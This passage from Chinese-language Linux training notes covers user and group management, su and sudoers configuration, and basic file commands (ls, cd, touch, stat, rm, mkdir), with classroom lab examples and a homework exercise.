<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh [-ls]</span><br><span class="line">选项与参数 :</span><br><span class="line">-l : 列出目前系统上面可用的 shell /etc/shells 里内容</span><br><span class="line">-s : 修改自己的 Shell</span><br><span class="line">[root@rhel7 ~]# chsh -s /bin/bash t1</span><br><span class="line">Changing shell for t1.</span><br><span class="line">Shell changed.</span><br><span class="line">[root@rhel7 ~]# grep t1 /etc/passwd</span><br><span class="line">t1:x:888:1000::/home/t1:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="删除用户和组"><a href="#删除用户和组" class="headerlink" title="删除用户和组"></a>删除用户和组</h3><h4 id="groupdel"><a href="#groupdel" class="headerlink" title="groupdel"></a>groupdel</h4><p>删除组</p>
<p>groupdel groupname</p>
<h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>删除用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">userdel [-r] username</span><br><span class="line">选项不参数 :</span><br><span class="line">-r 没有这个选项删除会不彻底,关于用户的目录、文档全部删除</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# tail -3 /etc/group</span><br><span class="line">test:x:999:</span><br><span class="line">test2:x:1000:</span><br><span class="line">test3:x:1001:t1</span><br><span class="line">[root@rhel7 ~]# groupdel test3</span><br><span class="line">[root@rhel7 ~]# tail -3 /etc/group</span><br><span class="line">baby:x:490:</span><br><span class="line">test:x:999:</span><br><span class="line">test2:x:1000:</span><br><span class="line">[root@rhel7 ~]# userdel -r t1</span><br><span class="line">[root@rhel7 ~]# ll /home</span><br><span class="line">total 12</span><br><span class="line">drwx------. 27 cong cong 4096 Jan 1 18:40 cong</span><br><span class="line">drwx------. 4 g2</span><br><span class="line">888 4096 Mar 21 03:56 g2</span><br><span class="line">drwx------. 12 tom tom 4096 Mar 21 02:14 tom</span><br></pre></td></tr></table></figure>

<h3 id="查看用户和组信息"><a href="#查看用户和组信息" class="headerlink" title="查看用户和组信息"></a>查看用户和组信息</h3><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>查看已存在用户的基本信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# id root</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@rhel7 ~]# id -g root</span><br><span class="line">0</span><br><span class="line">[root@rhel7 ~]# id -u root</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h4 id="groups"><a href="#groups" class="headerlink" title="groups"></a>groups</h4><p>查看当前用户支持的群组信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# groups</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>思考题: root 和普通用户都可以修改 /etc/passwd 文档,那么这个文档的权限是什么呢?<br>SUID</p>
<h2 id="用户身份切换-sudo-su"><a href="#用户身份切换-sudo-su" class="headerlink" title="用户身份切换 sudo / su"></a>用户身份切换 sudo / su</h2><h3 id="su"><a href="#su" class="headerlink" title="su"></a>su</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su [-lm] [-c 指令 ] [username]</span><br><span class="line">选项与参数 :</span><br><span class="line">- : 单纯使用 - 如『 su - 』 以 login-shell 变量档案读取方式登入系统 ; 默认切换为 root</span><br><span class="line">-l : 与 - 类似 login-shell</span><br><span class="line">-m :-m 与 -p 一样 , 表示『使用目前的环境设定 , 而不读取新使用者的配置文件』</span><br><span class="line">-c : 接指令</span><br></pre></td></tr></table></figure>

<p>总结:</p>
<ol>
<li>su - username 或 su -l username<br>完整切换成新使用者的环境 用 env 查看环境变量<br>PATH/USER/MAIL</li>
<li>su - -c “ 指令 “<br>仅想要执行一次 root 的指令</li>
<li>使用 root 切换成为任何使用者时 , 不需要输入新用户密码</li>
<li>缺点:当主机多人管理时, su 切换成 root ,那每个人都需要知道 root 密码,不安全。</li>
</ol>
<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>sudo [-u user name | #uid] [command]</p>
<h4 id="sudo-执行流程"><a href="#sudo-执行流程" class="headerlink" title="sudo 执行流程"></a>sudo 执行流程</h4><ol>
<li>在 /etc/sudoers 档案中查看 user 是否有 sudo 执行权限</li>
<li>若有 sudo 执行权限 , 『输入用户的密码』</li>
<li>密码正确 , 开始执行 sudo 后续接的指令</li>
<li>root 无需密码,自己切换自己也无需密码</li>
</ol>
<h4 id="添加用户-sudo-执行权限的方法"><a href="#添加用户-sudo-执行权限的方法" class="headerlink" title="添加用户 sudo 执行权限的方法"></a>添加用户 sudo 执行权限的方法</h4><p>(如何让用户可以使用 sudo ?)</p>
<ol>
<li>visudo 可以让系统检验 /etc/sudoers 的语法是否正确</li>
<li>修改 /etc/sudoers 中的语法</li>
</ol>
<p>1 )单一用户可使用 root 所有指令或某些指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root 		ALL=(ALL) 	ALL &lt;== 找到这一行 ,rh6 在 98 行</span><br><span class="line">username 	ALL=(ALL) 	ALL &lt;== 新增这一行</span><br><span class="line">username 	ALL=(root) 	/bin/touch&lt;== 新增这一行</span><br></pre></td></tr></table></figure>

<p>语法解释:</p>
<p>使用者账号 登入者的来源主机名 =( 可切换的身份 )     可下达的指令</p>
<p>root             ALL=(ALL)                 ALL &lt;== 这是默认值</p>
<ol>
<li>使用者帐号:系统哪个帐号可以使用 sudo</li>
<li>登入者的来源主机名:信任用户 默认 root 可来自任何一部网络主机</li>
<li>可切换的身份:该账号可以切换成谁来下命令 , 末日 root 可以切换成任何人</li>
<li>可下达的指令:可用该身份下达什么指令。必需使用绝对路径 ( 可通过 which\whereis 查询 )</li>
<li>ALL : 是特殊关键词 , 代表任何身份、任何主机、任何命令</li>
</ol>
<p>2 )群组和免密码的功能处理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">wheel ALL=(ALL) ALL&lt;== 找到这一行 ,rh6 在 105 行</span></span><br><span class="line"><span class="meta">%</span><span class="bash">wheel ALL=(ALL) NOPASSWD: ALL&lt;== 找到这一行 ,rh6 在 108 行</span></span><br></pre></td></tr></table></figure>

<p>语法解释:</p>
<ol>
<li>% 接群组</li>
<li>wheel 群组内的用户有使用 sudo 的权限,并可以切换成任何人,执行切换后身份的任何命令</li>
<li>wheel 群组内的用户切换用户时不需要输入自己的密码</li>
</ol>
<p>3）有限的权限操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dabao ALL=(root) /usr/bin/passwd &lt;== 有 bug , dabao 能修改 root 密码</span><br><span class="line">dabao ALL=(root) !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*,!/usr/bin/passwd root&lt;== 可以执</span><br><span class="line">行『 passwd 任意字符』 , 但是『 passwd 』和『 passwd root 』这两个命令不可执行</span><br></pre></td></tr></table></figure>

<p>4 )别名设置 visudo</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">User_Alias DABAO=dabao,jerry,tom,g1,g2,g3</span><br><span class="line">Cmnd_Alias DABAOCOM = !/usr/bin/passwd,/usr/bin/passwd [A-Za-z]*,!/usr/bin/passwd root</span><br><span class="line">DABAO ALL=(root) DABAOCOM</span><br></pre></td></tr></table></figure>

<p>5) sudo 搭配 su 使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username ALL=(root) /bin/su -</span><br><span class="line">sudo su - &lt;==sudo -u root su -l root</span><br></pre></td></tr></table></figure>
<p>可以直接切换成 root 用户,而且不需要输入 root 密码</p>
<p>6 ) 5 分钟内可以不用再输入密码。</p>
<h2 id="Linux用户和组课后作业"><a href="#Linux用户和组课后作业" class="headerlink" title="Linux用户和组课后作业"></a>Linux用户和组课后作业</h2><ol>
<li>新建一个用户名为 redhat。密码为 password ，配置以下信息,以达到要求:</li>
</ol>
<ul>
<li>密码的最小存活期为:1 天</li>
<li>密码的最大存活期为:10 天</li>
<li>密码过期前 5 天提醒</li>
<li>密码过期后如 15 天仍未设置新密码,则封锁该帐户。</li>
</ul>
<ol>
<li>创建一个新组 newgroup、将 redhat 以附加组成员的身份加入 到 newgroup 中。</li>
<li>添加 3 个用户,用户 harry,natasha,tom,和一个组 ,组名为 admin 组 ，<br>要求 ：</li>
</ol>
<ul>
<li>harry,natasha 用户的附加组为 admin 组；</li>
<li>tom 用户的登陆 shell 为非交互式 shell；</li>
<li>用户密码都为 uplooking</li>
</ul>
<ol>
<li>使用 harry 用户登陆系统,尝试修改自己的密码,密码自己设 定。</li>
<li>创建一个叫做 alex 用户,用户 uid 为 1234,不能登陆系统。</li>
<li>以 root 用户身份给 natasha 用户修改密码,密码修改为 abc12345。</li>
<li>给 tom 用户追加附加组,追加的附加组为 alex,同时给 tom 用户修改 uid,修改为 2222。</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 基础命令</title>
    <url>/2016/12/22/booboo_linux_base/01-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<ul>
<li><p>在教室物理机包括rhel7和rhel6两台实验虚拟机，上打开虚拟机命令: <em>rht-vmctl start rhel7</em> </p>
<ul>
<li>在物理机上远程登陆到虚拟机rhel7 <em>ssh root@rhel7-fN</em> ，<em>N</em> 为你的机器编号， <em>root</em>密码都是<em>uplooking</em>，系统中有一个普通用户<em>student</em>，其密码为<em>student</em>。</li>
<li>在虚拟机中关闭虚拟机的命令为<em>shutdown -h now</em>，也可以在物理机上执行<em>rht-vmctl poweroff rhel7</em>。</li>
</ul>
</li>
<li><p>在物理机上设置录屏视频，由于Gnome3的bug会有30秒时间限制，修正时间限制的命令如下：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[kiosk@fundation0 ~]$ gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length "uint32 0"</span><br></pre></td></tr></table></figure>

<h2 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h2><h3 id="命令的构成"><a href="#命令的构成" class="headerlink" title="命令的构成"></a>命令的构成</h3><p>命令字 选项 参数</p>
<ul>
<li>命令分:内部命令、外部命令;</li>
<li>选项: - 单个字符 – 多个字符</li>
<li>参数:对谁执行这个命令,可以有多个,选项和参数可以互换位置</li>
</ul>
<h3 id="命令使用的原因"><a href="#命令使用的原因" class="headerlink" title="命令使用的原因"></a>命令使用的原因</h3><p>Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。实际上Shell是一个命令解释器，它解释由用户输入的命令并且把它们送到内核。从这里开始学习Linux命令，本课程让你更清楚地了解和掌握它，在Linux中命令是讲究大小写的。使用命令即快速又能减少机器的性能消耗。</p>
<h3 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h3><ul>
<li># root 用户</li>
<li>$ 一般用户</li>
<li>[ 用户的身份 @ 主机名 当前位置 ]</li>
</ul>
<p>当前位置显示的是目录名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# hostname</span><br><span class="line">www.dabao.com</span><br><span class="line">[root@rhel7 ~]# groupadd tom</span><br><span class="line">[root@rhel7 ~]# useradd -g tom tom</span><br><span class="line">[root@rhel7 ~]# id tom</span><br><span class="line">uid=501(tom) gid=501(tom) groups=501(tom)</span><br><span class="line">[root@rhel7 ~]# su - tom</span><br><span class="line">[tom@rhel7 ~]$ who</span><br><span class="line">root tty1</span><br><span class="line">2016-03-20 23:56 (:0)</span><br><span class="line">root pts/0</span><br><span class="line">2016-03-21 00:39 (:0.0)</span><br></pre></td></tr></table></figure>

<h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><table>
<thead>
<tr>
<th align="left">常用参数</th>
<th align="left">含义及用法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-l</td>
<td align="left">long 的缩写 详细列出当前目录下的所有文件属性     七列 文件名 &lt;=255 个字符</td>
</tr>
<tr>
<td align="left">-d</td>
<td align="left">directory 的缩写 查看当前目录本身的信息</td>
</tr>
<tr>
<td align="left">-h</td>
<td align="left">以人性化的方式显示文件大小,录的大小并不代表目录内所有文件的大小 du -sh /etc&lt;== 查看 etc 目录真正的大小</td>
</tr>
<tr>
<td align="left">-a</td>
<td align="left">查看隐藏文件 以 . 开头的文件</td>
</tr>
<tr>
<td align="left">-R</td>
<td align="left">查看多层目录</td>
</tr>
<tr>
<td align="left">-b</td>
<td align="left">特殊字符将以 \ 分割 ls 查看有特殊字符的文件</td>
</tr>
</tbody></table>
<h4 id="ls实验"><a href="#ls实验" class="headerlink" title="ls实验"></a>ls实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 tmp]$ ls -hl</span><br><span class="line">total 68K</span><br><span class="line">srwxr-xr-x. 1 root root 0 Mar 20 23:59 gedit.root.3177893063</span><br><span class="line">drwx------. 2 root root 4.0K Feb 5 18:24 keyring-JL7MKY</span><br><span class="line">[tom@rhel7 tmp]$ ls -ld /tmp</span><br><span class="line">drwxrwxrwt. 22 root root 4096 Mar 21 00:43 /tmp</span><br><span class="line">[tom@rhel7 tmp]$ ls -la /tmp</span><br><span class="line">total 96</span><br><span class="line">drwxrwxrwt. 22 root root 4096 Mar 21 00:43 .</span><br><span class="line">dr-xr-xr-x. 29 root root 4096 Mar 20 23:55 ..</span><br><span class="line">drwx------. 2 root root 4096 Mar 20 23:56 .esd-0</span><br><span class="line">drwx------. 2 cong cong 4096 Jan 1 18:33 .esd-500</span><br><span class="line">[tom@rhel7 tmp]$ ls -bl</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 00:48 a\ b.txt</span><br><span class="line">[tom@rhel7 tmp]$ ls -l</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 00:48 a b.txt</span><br><span class="line">[tom@rhel7 tmp]$ mkdir -p a/b/c</span><br><span class="line">[tom@rhel7 tmp]$ ls -lR a/</span><br><span class="line">a/:</span><br><span class="line">total 4</span><br><span class="line">drwxrwxr-x. 3 tom tom 4096 Mar 21 00:50 b</span><br><span class="line">a/b:</span><br><span class="line">total 4</span><br><span class="line">drwxrwxr-x. 2 tom tom 4096 Mar 21 00:50 c</span><br><span class="line">a/b/c:</span><br><span class="line">total 0</span><br></pre></td></tr></table></figure>

<h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><table>
<thead>
<tr>
<th align="left">cd</th>
<th align="left">change directory 切换工作目录</th>
</tr>
</thead>
<tbody><tr>
<td align="left">绝对路径</td>
<td align="left">以根为起始的路径</td>
</tr>
<tr>
<td align="left">相对路径</td>
<td align="left">~当前用户的家目录 ;. 当前目录 ;.. 上一层用户 ;- 回到上一次所在位置</td>
</tr>
</tbody></table>
<h4 id="cd实验"><a href="#cd实验" class="headerlink" title="cd实验"></a>cd实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 tmp]$ cd /etc/</span><br><span class="line">[tom@rhel7 etc]$ cd ~</span><br><span class="line">[tom@rhel7 ~]$ cd .</span><br><span class="line">[tom@rhel7  ~]$ cd ..</span><br><span class="line">[tom@rhel7  home]$ cd -</span><br><span class="line">/home/tom</span><br></pre></td></tr></table></figure>

<h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>pwd:print working directory 显示当前所在位置的绝对路径</p>
<h4 id="pwd实验"><a href="#pwd实验" class="headerlink" title="pwd实验"></a>pwd实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 tmp]$ cd /etc/nginx</span><br><span class="line">[tom@rhel7 nginx]$ cd conf.d</span><br><span class="line">[tom@rhel7 conf.d]$ pwd</span><br><span class="line">/etc/nginx/conf.d</span><br></pre></td></tr></table></figure>

<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符 *"></a>通配符 *</h3><p>匹配任意多个字符</p>
<p>例如：a* 包括aa*、ab*、ac* 等等 </p>
<h3 id="通配符-1"><a href="#通配符-1" class="headerlink" title="通配符 ?"></a>通配符 ?</h3><p>匹配任意单个字符<br>例如： a? 可以是ab、ac、ad、a1、a9、a#等等</p>
<h4 id="？实验"><a href="#？实验" class="headerlink" title="*？实验"></a>*？实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f *1</span><br><span class="line">rm -f 1*</span><br><span class="line">rm -f 1*1</span><br><span class="line">rm -f test?</span><br><span class="line">想删除 test 后面有一个字符的文件</span><br></pre></td></tr></table></figure>

<h3 id="管道"><a href="#管道" class="headerlink" title="| 管道"></a>| 管道</h3><p>output | input</p>
<p>对某些命令执行的结果去作操作,会用到管道；用于命令与命令之间的连接，前一个命令的输出是后一个命令的输入</p>
<h4 id="管道实验"><a href="#管道实验" class="headerlink" title="| 管道实验"></a>| 管道实验</h4><p>详细列出 /tmp 目录下的文件,并截取以空格为分割的第三列</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ ls -l /tmp|cut -d" " -f3</span><br><span class="line">tom</span><br><span class="line">tom</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">详细列出 /tmp 目录下的文件,截取含有关键字 tom 的行,再截取以空格为分割的第一列内容</span><br><span class="line">[tom@rhel7 ~]$ ls -l /tmp|grep tom|cut -d" " -f1</span><br><span class="line">drwxrwxr-x.</span><br><span class="line">-rw-rw-r--.</span><br></pre></td></tr></table></figure>

<h2 id="针对文件的的基本操作"><a href="#针对文件的的基本操作" class="headerlink" title="针对文件的的基本操作"></a>针对文件的的基本操作</h2><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p>touch [filename] </p>
<p>创建文件,参数可以跟多个</p>
<p>如果要创建 50 个有规律的文件,例如 text1-text50</p>
<p>利用参数扩展</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch test&#123;1..50&#125;</span><br><span class="line">touch test&#123;a..e&#125;</span><br><span class="line">touch test&#123;a..e&#125;_&#123;1..3&#125;---&gt; 会创建 a_1 a_2 a_3...</span><br></pre></td></tr></table></figure>

<p>上帝之手,本来是用来修改文件时间戳的。文件的三个时间 ctime\mtime\atime</p>
<p>拓展内容：可以通过“stat”命令查看文件的三个时间</p>
<p>touch “ “ 可以放一些特殊字符</p>
<h4 id="touch实验"><a href="#touch实验" class="headerlink" title="touch实验"></a>touch实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ touch test&#123;a..c&#125;_&#123;1..4&#125;</span><br><span class="line">[tom@rhel7 ~]$ ls</span><br><span class="line">testa_1 testa_4 testb_3 testc_2</span><br><span class="line">testa_2 testb_1 testb_4 testc_3</span><br><span class="line">testa_3 testb_2 testc_1 testc_4</span><br><span class="line"></span><br><span class="line">--full-time可以查看mtime的完整时间</span><br><span class="line"></span><br><span class="line">[tom@rhel7 ~]$ ls -l --full-time</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_4</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_4</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_4</span><br><span class="line"></span><br><span class="line">[tom@rhel7 ~]$ touch "ab cd"</span><br><span class="line"></span><br><span class="line">[tom@rhel7 ~]$ ls -b</span><br><span class="line">ab\ \ \ cd testa_3 testb_2 testc_1 testc_4</span><br><span class="line">testa_1 testa_4 testb_3 testc_2</span><br><span class="line">testa_2 testb_1 testb_4 testc_3</span><br></pre></td></tr></table></figure>

<h4 id="touch拓展实验"><a href="#touch拓展实验" class="headerlink" title="touch拓展实验"></a>touch拓展实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ touch booboo</span><br><span class="line">[booboo@rhel7 ~]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 booboo booboo 0 Jun 15 23:28 booboo</span><br><span class="line">[booboo@rhel7 ~]$ stat booboo</span><br><span class="line">  File: ‘booboo’</span><br><span class="line">  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: fd01h/64769d	Inode: 143         Links: 1</span><br><span class="line">Access: (0664/-rw-rw-r--)  Uid: ( 1001/  booboo)   Gid: ( 1001/  booboo)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2016-06-15 23:28:55.041578819 -0400     #atime 文件最近一次被访问的时间</span><br><span class="line">Modify: 2016-06-15 23:28:55.041578819 -0400    #mtime 文件内容最近一次修改的时间</span><br><span class="line">Change: 2016-06-15 23:28:55.041578819 -0400    #ctime 文件属性最近一次修改的时间</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>使用cat去访问booboo文件，可以发现atime被修改了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ cat booboo</span><br><span class="line">[booboo@rhel7 ~]$ stat booboo</span><br><span class="line">  File: ‘booboo’</span><br><span class="line">  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: fd01h/64769d	Inode: 143         Links: 1</span><br><span class="line">Access: (0664/-rw-rw-r--)  Uid: ( 1001/  booboo)   Gid: ( 1001/  booboo)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2016-06-15 23:32:35.898724748 -0400</span><br><span class="line">Modify: 2016-06-15 23:28:55.041578819 -0400</span><br><span class="line">Change: 2016-06-15 23:28:55.041578819 -0400</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>通过chmod修改文件权限后，会看到ctime时间改变，通过ll命令看到的时间为mtime</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ chmod 777 booboo</span><br><span class="line">[booboo@rhel7 ~]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rwxrwxrwx. 1 booboo booboo 0 Jun 15 23:28 booboo  </span><br><span class="line">[booboo@rhel7 ~]$ stat booboo</span><br><span class="line">  File: ‘booboo’</span><br><span class="line">  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: fd01h/64769d	Inode: 143         Links: 1</span><br><span class="line">Access: (0777/-rwxrwxrwx)  Uid: ( 1001/  booboo)   Gid: ( 1001/  booboo)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2016-06-15 23:32:35.898724748 -0400</span><br><span class="line">Modify: 2016-06-15 23:28:55.041578819 -0400</span><br><span class="line">Change: 2016-06-15 23:33:49.195445761 -0400</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>通过echo命令向booboo文件追加一些内容，会看到mtime时间变了，并且ctime也变了，思考为什么？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ echo hi &gt;&gt; booboo</span><br><span class="line">[booboo@rhel7 ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx. 1 booboo booboo 3 Jun 15 23:34 booboo</span><br><span class="line">[booboo@rhel7 ~]$ stat booboo</span><br><span class="line">  File: ‘booboo’</span><br><span class="line">  Size: 3         	Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: fd01h/64769d	Inode: 143         Links: 1</span><br><span class="line">Access: (0777/-rwxrwxrwx)  Uid: ( 1001/  booboo)   Gid: ( 1001/  booboo)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2016-06-15 23:32:35.898724748 -0400</span><br><span class="line">Modify: 2016-06-15 23:34:53.251332183 -0400</span><br><span class="line">Change: 2016-06-15 23:34:53.251332183 -0400</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><table>
<thead>
<tr>
<th align="left">rm</th>
<th align="left">[filename] remove 删除文件,对 root 用户有提示,普通用户没有提示</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-f</td>
<td align="left">force 强制删除, root 无提示</td>
</tr>
<tr>
<td align="left">-i</td>
<td align="left">普通用户有提示的删除</td>
</tr>
<tr>
<td align="left">-r</td>
<td align="left">递归删除,慎重使用 -rf</td>
</tr>
</tbody></table>
<h4 id="rm实验"><a href="#rm实验" class="headerlink" title="rm实验"></a>rm实验</h4><p>普通用户 tom</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ rm testa_1</span><br><span class="line">[tom@rhel7 ~]$ rm -i testa_2</span><br><span class="line">rm: remove regular empty file `testa_2'? Y</span><br></pre></td></tr></table></figure>

<p>root 用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# rm a.test</span><br><span class="line">rm: remove regular empty file `a.test'? Y</span><br><span class="line">[root@rhel7 ~]# rm -f b.test</span><br></pre></td></tr></table></figure>

<p>普通用户 tom</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ mkdir -p a/b/c</span><br><span class="line">[tom@rhel7 ~]$ rm a/</span><br><span class="line">rm: cannot remove `a/': Is a directory</span><br><span class="line">[tom@rhel7 ~]$ rm -r a/</span><br></pre></td></tr></table></figure>

<h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p>mkdir:make directory 创建目录</p>
<p><code>mkdir -p /test/test1</code></p>
<p>递归创建目录</p>
<p><code>mkdir {a..e}</code></p>
<p>创建 a-e 的目录</p>
<p><code>touch {a..e}/file{1..4}</code></p>
<p> 在 a-e 的目录下新建 file1-file4 文件</p>
<h4 id="mkdir实验"><a href="#mkdir实验" class="headerlink" title="mkdir实验"></a>mkdir实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ mkdir -p test/test1</span><br><span class="line">[tom@rhel7 ~]$ ls</span><br><span class="line">ab cd testa_3 testb_2 testc_1 testc_4</span><br><span class="line">p        testa_4 testb_3 testc_2</span><br><span class="line">test    testb_1 testb_4 testc_3</span><br><span class="line">[tom@rhel7 ~]$ mkdir &#123;a..f&#125;</span><br><span class="line">[tom@rhel7 ~]$ ls</span><br><span class="line">a d test testb_2 testc_2</span><br><span class="line">ab cd e testa_3 testb_3 testc_3</span><br><span class="line">b f testa_4 testb_4 testc_4 c p testb_1 testc_1</span><br><span class="line">[tom@rhel7 ~]$ touch &#123;a..f&#125;/file&#123;1..4&#125;</span><br><span class="line">[tom@rhel7 ~]$ ls</span><br><span class="line">a d test testb_2 testc_2</span><br><span class="line">ab cd e testa_3 testb_3 testc_3</span><br><span class="line">b f testa_4 testb_4 testc_4 c p testb_1 testc_1</span><br><span class="line">[tom@rhel7 ~]$ ls -rR</span><br><span class="line">.:</span><br><span class="line">testc_4 testb_4 testa_4 f b</span><br><span class="line">testc_3 testb_3 testa_3 e ab cd</span><br><span class="line">testc_2 testb_2 test d a</span><br><span class="line">testc_1 testb_1 p c</span><br><span class="line">./test:</span><br><span class="line">test1</span><br><span class="line">./test/test1:</span><br><span class="line">./p:</span><br><span class="line">./f:</span><br><span class="line">file4 file3 file2 file1</span><br><span class="line">./e:</span><br><span class="line">file4 file3 file2 file1</span><br><span class="line">./d:</span><br><span class="line">file4 file3 file2 file1</span><br><span class="line">./c:</span><br><span class="line">file4 file3 file2 file1</span><br><span class="line">./b:</span><br><span class="line">file4 file3 file2 file1</span><br><span class="line">./a:</span><br><span class="line">file4 file3 file2 file1</span><br></pre></td></tr></table></figure>

<h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p>rmdir:remove directory 删除目录</p>
<p>只能删除空目录,出于安全性的考虑</p>
<p><code>rm -rf [d_name]</code></p>
<p>可以删除非空目录</p>
